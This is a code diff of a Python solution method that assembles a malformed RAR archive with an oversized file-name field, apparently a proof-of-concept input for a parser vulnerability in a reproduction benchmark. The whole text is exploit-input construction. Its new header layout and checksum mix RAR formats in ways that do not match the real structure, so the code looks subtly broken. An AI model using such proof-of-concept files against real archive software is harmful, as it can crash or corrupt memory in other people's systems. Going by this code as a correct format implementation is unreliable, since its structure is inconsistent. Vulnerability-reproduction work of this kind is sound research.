@@ -1,22 +1,71 @@
+import struct
+
+def crc16(data):
+    crc = 0x0000
+    for byte in data:
+        crc ^= (byte << 8) & 0xffff
+        for _ in range(8):
+            if crc & 0x8000:
+                crc = ((crc << 1) & 0xffff) ^ 0x1021
+            else:
+                crc = (crc << 1) & 0xffff
+    return crc
+
+def encode_varint(val):
+    if val == 0:
+        return b'\x00'
+    bytes_list = []
+    while val > 0:
+        bytes_list.append(val & 0x7f)
+        val >>= 7
+    for i in range(len(bytes_list) - 1):
+        bytes_list[i] |= 0x80
+    return bytes(bytes_list)
+
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        magic = b'Rar!\x05\x00'
-        # Archive header block: minimal, header_size=8, data_size=0, flags=0x0001
-        archive_header_size = b'\x08\x00'
-        archive_data_size = b'\x00\x00\x00\x00'
-        archive_flags = b'\x01\x00'
-        archive_header = archive_header_size + archive_data_size + archive_flags
-        # File header block: assume header_size=12 (8 + 4 additional fields), data_size small, flags for file, then large name size in additional
-        file_header_size = b'\x0c\x00'
-        file_data_size = b'\x00\x00\x00\x00'  # pack size 0
-        file_flags = b'\x02\x00'  # assume file type
-        # Additional header fields: assume host_os=1 byte, method=1, then name_size 4 bytes large
-        host_os = b'\x01'  # Windows
-        method = b'\x30'  # store
-        large_name_size = (0x7fffffff).to_bytes(4, 'little')
-        file_header = file_header_size + file_data_size + file_flags + host_os + method + large_name_size
-        # Then some name data to pad to approx 1089
-        remaining = 1089 - len(magic + archive_header + file_header)
-        name_data = b'A' * max(0, remaining)
-        poc = magic + archive_header + file_header + name_data
+        sig = b'Rar!\x1A\x07\x00'
+        # ARCHIVE_HEADER
+        type_a = b'\x73'
+        flags_a = b'\x00'
+        size_a = 8
+        body_a = b''
+        data_crc_a = type_a + flags_a + struct.pack('<I', size_a) + body_a
+        crca = crc16(data_crc_a)
+        header_a = struct.pack('<H', crca) + type_a + flags_a + struct.pack('<I', size_a) + body_a
+        # FILE_HEADER
+        type_f = b'\x74'
+        flags_f = b'\x00'
+        unp_size = 0
+        attr = 0
+        file_flags = 0
+        meth = 0x30
+        os_type = 0
+        file_crc = 0
+        comp_flags = 0
+        body_f = (struct.pack('<Q', unp_size) +
+                  struct.pack('<I', attr) +
+                  struct.pack('<B', file_flags) +
+                  struct.pack('<B', meth) +
+                  struct.pack('<B', os_type) +
+                  struct.pack('<I', file_crc) +
+                  struct.pack('<H', comp_flags))
+        size_f = 8 + len(body_f)
+        data_crc_f = type_f + flags_f + struct.pack('<I', size_f) + body_f
+        crcf = crc16(data_crc_f)
+        header_f = struct.pack('<H', crcf) + type_f + flags_f + struct.pack('<I', size_f) + body_f
+        # Name
+        name_size = 1035
+        varint = encode_varint(name_size)
+        name = b'A' * name_size
+        # END_HEADER
+        type_e = b'\x00'
+        flags_e = b'\x00'
+        size_e = 8
+        body_e = b''
+        data_crc_e = type_e + flags_e + struct.pack('<I', size_e) + body_e
+        crce = crc16(data_crc_e)
+        header_e = struct.pack('<H', crce) + type_e + flags_e + struct.pack('<I', size_e) + body_e
+        # Assemble
+        poc = sig + header_a + header_f + varint + name + header_e
         return poc
